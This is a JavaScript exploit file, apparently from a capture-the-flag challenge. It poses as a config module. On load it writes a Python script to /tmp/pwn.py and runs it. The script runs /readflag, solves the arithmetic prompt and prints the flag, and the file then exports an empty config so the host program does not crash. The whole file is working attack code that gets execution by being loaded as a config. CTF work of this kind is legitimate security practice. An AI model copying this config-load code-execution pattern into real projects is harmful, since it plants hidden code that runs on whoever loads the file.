const { execSync } = require('child_process');
const fs = require('fs');

console.error("\n[EXPLOIT] JS Config Loaded! Starting attack...\n");

// 1. 写入 Python 攻击脚本到临时文件
const pythonPayload = `
import os, subprocess, re, sys
sys.stderr.write("[EXPLOIT] Python helper started\\n")
try:
    p = subprocess.Popen(["/readflag"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, bufsize=0)
    buffer = ""
    while True:
        char = p.stdout.read(1)
        if not char: break
        buffer += char
        if "input your answer:" in buffer: break
    
    sys.stderr.write(f"[EXPLOIT] Question: {buffer}\\n")
    match = re.search(r'(\d+)\\s*([+\\-*])\\s*(\d+)', buffer)
    if match:
        n1, op, n2 = int(match.group(1)), match.group(2), int(match.group(3))
        res = 0
        if op == '+': res = n1 + n2
        elif op == '-': res = n1 - n2
        elif op == '*': res = n1 * n2
        p.stdin.write(f"{res}\\n")
        p.stdin.flush()
        flag = p.stdout.read()
        print(f"\\n\\n[+] FLAG: {flag}\\n\\n", file=sys.stderr)
    else:
        sys.stderr.write("[EXPLOIT] Regex failed\\n")
except Exception as e:
    sys.stderr.write(f"[EXPLOIT] Error: {e}\\n")
`;

fs.writeFileSync('/tmp/pwn.py', pythonPayload);

// 2. 执行 Python 脚本
try {
    execSync('python3 /tmp/pwn.py', { stdio: 'inherit' });
} catch (e) {
    console.error("[EXPLOIT] Execution failed: " + e.message);
}

// 导出空配置，防止程序报错
module.exports = {};
